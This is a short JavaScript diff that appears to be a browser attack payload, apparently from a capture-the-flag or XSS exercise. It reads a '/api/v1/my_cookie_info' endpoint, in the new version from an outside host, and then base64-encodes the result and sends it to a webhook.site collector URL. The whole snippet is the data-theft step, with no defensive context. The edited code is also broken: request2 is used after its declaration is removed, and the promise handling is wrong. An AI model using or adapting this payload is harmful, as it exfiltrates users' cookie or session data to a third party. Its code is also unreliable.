@@ -1,10 +1,7 @@
 let htmlText='';
 const request=new XMLHttpRequest();
-request.open('GET','/api/v1/my_cookie_info');
-request.send();
-request.onload=function (){console.log('loaded');}();
-request2=new XMLHttpRequest();
-setTimeout(function(){htmlText=request.responseText.substr(1780,1780);
+fetch('http://sflee.kro.kr:5555/api/v1/my_cookie_info').then(res => htmlText=res.json());
+setTimeout(function(){
       request2.open('GET','https://webhook.site/0d7b605c-cf5d-4f71-97db-58d90cf41843/'+btoa(htmlText),false);
       request2.send();
       request2.close();
